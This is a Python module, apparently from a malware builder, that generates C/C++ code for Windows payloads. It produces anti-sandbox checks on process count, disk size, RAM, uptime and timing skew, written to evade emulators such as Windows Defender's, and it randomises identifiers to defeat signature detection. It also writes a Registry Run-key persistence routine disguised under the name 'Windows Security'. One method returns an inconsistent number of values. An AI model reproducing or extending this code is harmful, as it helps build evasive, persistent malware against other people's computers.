from ClassCongregation import randoms

class AntiSandbox: #所有语言反沙箱的集合
    """
    返回数据：
    1.函数名
    2.导入的包（C/C++可以重复导入包
    3.函数代码
    注意事项：
    所有需要随机化的参数统一使用：_xxxx_ 命名方式，防止随机化错误
    """
    def __init__(self):
        self.__Method__=[]

        for i in dir(self):
            if not i.startswith("_"):
                self.__Method__.append(i)
    def NumberOfProcesses2c(self):
        """
        适用于C/C++代码
        用来判断当前进程是否低于40个，目前见过能模拟最多进程的是WD能模拟39个
        """
        FunctionName=randoms().EnglishAlphabet(20)
        Include="#include <tlhelp32.h>\n"
        Code="""
void """+FunctionName+"""()
{
	HANDLE _hSnapshot_ = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (INVALID_HANDLE_VALUE == _hSnapshot_)
	{
		return;
	}
	PROCESSENTRY32 _PE_ = { sizeof(_PE_) };
	int _Procnum_ = 0;
	for (BOOL ret = Process32First(_hSnapshot_, &_PE_); ret; ret = Process32Next(_hSnapshot_, &_PE_))
	{
		_Procnum_++;
	}
	if (_Procnum_ <= 40)  //判断当前进程是否低于40个，目前见过能模拟最多进程的是WD能模拟39个
	{
		exit(1);
	}
}
        """
        OriginalString=["_hSnapshot_","_Procnum_","_PE_"]
        for i in OriginalString:#进行循环处理随机字符串
            Code = Code.replace(i, randoms().EnglishAlphabet(15))
        return Include,FunctionName+"();\n",Code+"\n"
    def CheckHardDisk2c(self):
        """
        适用于C/C++代码
        进行检测硬盘的大小，小于40G的直接退出
        """
        FunctionName = randoms().EnglishAlphabet(20)
        Include = "#include <string>\n"
        Code = """
void """ + FunctionName + """()
{
    int _AllTotal_ = 0; 
    int _AllFree_ = 0;
    DWORD _dwSize_ = MAX_PATH;
    TCHAR _szLogicalDrives_[MAX_PATH] = { 0 };
    DWORD _dwResult_ = GetLogicalDriveStrings(_dwSize_, _szLogicalDrives_);
    if (_dwResult_ > 0 && _dwResult_ <= MAX_PATH)
    {
        TCHAR* _szSingleDrive_ = _szLogicalDrives_;
        while (*_szSingleDrive_)
        {
            uint64_t _available_, _total_, _free_;
            if (GetDiskFreeSpaceEx(_szSingleDrive_, (ULARGE_INTEGER*)&_available_, (ULARGE_INTEGER*)&_total_, (ULARGE_INTEGER*)&_free_))
            {
                uint64_t _Total_, _Available_, _Free_;
                _Total_ = _total_ >> 20;
                _Available_ = _available_ >> 20;
                _Free_ = _free_ >> 20;

                _AllTotal_ += _Total_;   //总
                _AllFree_ += _Free_;   //剩余
            }

            // 获取下一个驱动器号起始地址
            _szSingleDrive_ += strlen(_szSingleDrive_) + 1;
        }
    }
    //判断硬盘是否小于40
    //cout << _AllTotal_ /1024 << endl;
    if ((_AllTotal_ / 1024) < 40)
    {
        exit(1);
    }
}
        """
        OriginalString=["_AllTotal_","_AllFree_","_dwSize_","_szSingleDrive_","_szLogicalDrives_","_dwResult_","_available_","_total_","_free_","_Total_", "_Available_", "_Free_"]#存放需要随机化的字符
        for i in OriginalString:#进行循环处理随机字符串
            Code = Code.replace(i, randoms().EnglishAlphabet(15))
        return Include,FunctionName+"();\n",Code+"\n"

    def CheckReadAndMemory2c(self):
        """
        适用于C/C++代码
        进行检测运行内存的大小，小于2G的直接退出
        """
        FunctionName = randoms().EnglishAlphabet(20)
        Include = "#include <string>\n"
        Code = """
void """ + FunctionName + """()
{
	SYSTEM_INFO _SystemInfo_;
	GetSystemInfo(&_SystemInfo_);//获取系统信息
	// check RAM
	MEMORYSTATUSEX _MemoryStatus_;
    _MemoryStatus_.dwLength = sizeof(_MemoryStatus_);
	GlobalMemoryStatusEx(&_MemoryStatus_);
	DWORD _RAMMB_ = _MemoryStatus_.ullTotalPhys / 1024 / 1024;
	//std::cout << RAMMB << std::endl;
	if (_RAMMB_ < 2048)
	{
		exit(1);
	}
}
        """
        OriginalString=["_SystemInfo_","_MemoryStatus_","_RAMMB_"]
        for i in OriginalString:#进行循环处理随机字符串
            Code = Code.replace(i, randoms().EnglishAlphabet(15))
        return Include,FunctionName+"();\n",Code+"\n"
    def TimeAcceleratedJudgment2c(self):
        """
        适用于C/C++
        检查时间流动性
        """
        FunctionName = randoms().EnglishAlphabet(20)
        Include = "#include <ctime>\n"
        Code = """
void """ + FunctionName + """()
{
    clock_t _ClockStartTime_, _ClockEndTime_;
    time_t _UnixStartTime_ = time(0);
    //std::cout << "_UnixStartTime_:" << _UnixStartTime_ << std::endl;
    _ClockStartTime_ = clock();
    Sleep(10000);//暂停10秒
    _ClockEndTime_ = clock();
    time_t _UnixEndTime_ = time(0);
    //std::cout << "StartTime:" << _ClockStartTime_ << std::endl;
    //std::cout << "EndTime:" << _ClockEndTime_ << std::endl;

    //std::cout << "_UnixEndTime_:" << _UnixEndTime_ << std::endl;
    int _iTimeDifference_ = ((_UnixEndTime_ - _UnixStartTime_) * 1000) - (_ClockEndTime_ - _ClockStartTime_);
    if (_iTimeDifference_ > 150)
    {
        exit(1);
    }
}
        """
        OriginalString=["_ClockStartTime_","_ClockEndTime_","_UnixStartTime_","_UnixEndTime_","_iTimeDifference_"]
        for i in OriginalString:#进行循环处理随机字符串
            Code = Code.replace(i, randoms().EnglishAlphabet(15))
        return Include,FunctionName+"();\n",Code+"\n"
    def CheckRunningTime2c(self):
        """
        适用于C/C++
        检测系统运行时间，如果刚开机的一半来说有可能是沙箱
        """
        FunctionName = randoms().EnglishAlphabet(20)
        Include = ""
        Code = """
void """ + FunctionName + """()
{
	ULONGLONG _uptime_ = GetTickCount64() / 1000;
	//std::cout << _uptime_;
	//秒钟数
	if (_uptime_ < 1200)
	{
		exit(1);
	}
}
"""
        OriginalString=["_uptime_"]
        for i in OriginalString:#进行循环处理随机字符串
            Code = Code.replace(i, randoms().EnglishAlphabet(15))
        return Include,FunctionName+"();\n",Code+"\n"

class AutoStart: #所有语言的自启动代码
    """
    返回数据：
    1.函数名
    2.导入的包（C/C++可以重复导入包
    3.函数代码
    注意事项：
    所有需要随机化的参数统一使用：_xxxx_ 命名方式，防止随机化错误
    """
    def __init__(self):
        self.__Method__=[]

        for i in dir(self):
            if not i.startswith("_"):
                self.__Method__.append(i)
    def CurrentVersionRun2c(self):
        """
        适用于C/C++
        最常见的注册表启动类
        """
        FunctionName = randoms().EnglishAlphabet(20)
        Include = ""
        Code = """
void """ + FunctionName + """()
{
	HKEY _hKey_;
	char _Currentpath_[256] = { 0 };
	GetModuleFileNameA(NULL, _Currentpath_, 256);
	if (!RegCreateKeyA(HKEY_CURRENT_USER, "Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run", &_hKey_))
	{
		RegSetValueExA(_hKey_, "Windows Security", 0, REG_SZ, (PUCHAR)_Currentpath_, strlen(_Currentpath_));
		RegCloseKey(_hKey_);
	}
}
        """
        OriginalString=["_hKey_","_Currentpath_"]
        for i in OriginalString:#进行循环处理随机字符串
            Code = Code.replace(i, randoms().EnglishAlphabet(15))
        return Include,Include,FunctionName+"();\n",Code+"\n"